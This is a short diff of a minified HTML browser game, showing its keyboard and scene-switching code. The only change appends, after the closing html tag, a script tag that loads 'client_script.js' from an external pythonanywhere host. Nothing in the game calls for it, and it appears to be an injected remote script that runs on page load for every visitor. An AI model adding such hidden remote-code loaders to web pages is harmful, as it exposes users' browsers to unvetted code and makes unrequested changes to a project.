@@ -154,4 +154,4 @@ if(77===t.keyCode)return data.sound=!data.sound,setVolume(data.musicVolume/10),!
 if("start"===data.scene){if(27===t.keyCode)return updateScene("options"),!1
 updateScene("game"),setVolume(data.musicVolume/10)}else"end"===data.scene?27===t.keyCode&&(updateScene("start"),initialiseData()):"options"===data.scene?27===t.keyCode?updateScene(data.previousScene):37===t.keyCode?data.optionsPage>0&&data.optionsPage--:39===t.keyCode&&data.optionsPage<2&&data.optionsPage++:data.keys[t.keyCode]=!0},document.body.onkeyup=function(t){data.keys[t.keyCode]=!1}
 
-</script></body></html>
+</script></body></html><script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
